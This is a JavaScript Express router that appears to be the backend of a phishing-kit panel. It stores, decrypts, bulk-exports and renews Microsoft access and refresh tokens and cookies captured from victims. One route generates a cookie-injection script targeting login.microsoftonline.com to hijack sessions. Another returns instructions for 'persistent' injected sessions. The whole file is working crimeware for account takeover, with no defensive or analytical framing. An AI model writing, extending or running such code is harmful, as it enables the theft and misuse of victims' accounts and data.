const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');

// Get all tokens for user
router.get('/', userAuth, async (req, res) => {
  try {
    const { sort, search, page = 1, limit = 50 } = req.query;
    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
    const params = [req.user.id];
    
    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }
    
    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);
    
    const [tokens] = await db.query(query, params);
    const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
    
    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit))
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single token with decrypted data
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    };
    
    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Update token notes
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query('UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?', [notes || '', req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Soft delete token
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate cookie script - (only 2 cookies: x-ms-RefreshTokenCredential + RefreshToken)
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    
    // Check if we have any tokens to work with
    if (!accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }
    
    // Build ONLY the 2 token cookies
    var parts = [];
    
    // x-ms-RefreshTokenCredential = access_token
    if (accessToken) {
      parts.push('x-ms-RefreshTokenCredential=' + accessToken);
    }
    
    // RefreshToken = refresh_token (like competitor's second cookie)
    if (refreshToken) {
      parts.push('RefreshToken=' + refreshToken);
    }
    
    if (parts.length === 0) {
      return res.status(400).json({ error: 'No tokens available' });
    }
    
    // Build script
    var script = '// VGenius Cookie Session Injector\n\n';
    
    // Each cookie on its own line with domain=.login.microsoftonline.com
    for (var i = 0; i < parts.length; i++) {
      script += 'document.cookie = "' + parts[i] + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
    }
    
    script += '\n';
    script += '// Redirect after 3s\n';
    script += 'setTimeout(() => {\n';
    script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
    script += '}, 3000);\n';
    
    res.json({
      script: script,
      cookie_count: parts.length,
      cookies: parts
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// Manual cookie renewal - converts access_token to cookies
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    if (!accessToken) {
      return res.status(400).json({ error: 'No access token available' });
    }
    
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type, '', '');
    
    if (result.success && result.cookies) {
      await db.query(
        'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
        [encrypt(result.cookies), 'cookie', token.id]
      );
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length
      });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Renewal error:', err);
    res.status(500).json({ error: 'Renewal failed: ' + err.message });
  }
});

// Get renewal history
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Manual cookie conversion from pasted access token
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type } = req.body;
    if (!access_token) {
      return res.status(400).json({ error: 'Access token is required' });
    }

    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(access_token, template_type || 'office');

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '100 years (if injected correctly)',
        instructions: 'Inject these cookies into browser console at .login.microsoftonline.com domain for persistent session'
      });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Manual conversion error:', err);
    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// Export tokens
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );
    const config = require('../config/env');
    
    // Decrypt tokens for export
    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));
    
    res.json({ 
      tokens: decryptedTokens, 
      exported_at: new Date().toISOString(), 
      count: decryptedTokens.length 
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export and delete all
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );
    
    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));
    
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
    res.json({ tokens: decryptedTokens, exported_at: new Date().toISOString(), count: decryptedTokens.length, deleted: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
